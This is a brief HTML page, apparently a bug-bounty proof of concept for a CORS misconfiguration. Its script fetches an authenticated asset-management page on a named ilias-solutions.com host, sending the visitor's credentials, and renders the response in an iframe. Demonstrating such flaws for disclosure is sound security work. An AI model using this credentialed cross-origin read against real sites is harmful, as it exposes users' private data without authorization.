<!DOCTYPE html>
<html>
<head>
  <title>CORS Page Viewer</title>
</head>
<body>
  <h2>Load CORS content from intigriti.ilias-solutions.com</h2>
  <button onclick="loadPage()">Load Page</button>
  <iframe id="corsFrame" width="100%" height="600px"></iframe>

  <script>
    function loadPage() {
      fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
        credentials: "include"
      })
      .then(res => res.text())
      .then(html => {
        const iframe = document.getElementById('corsFrame');
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        doc.open();
        doc.write(html);
        doc.close();
      })
      .catch(err => {
        alert("CORS failed or blocked.");
        console.error(err);
      });
    }
  </script>
</body>
</html>
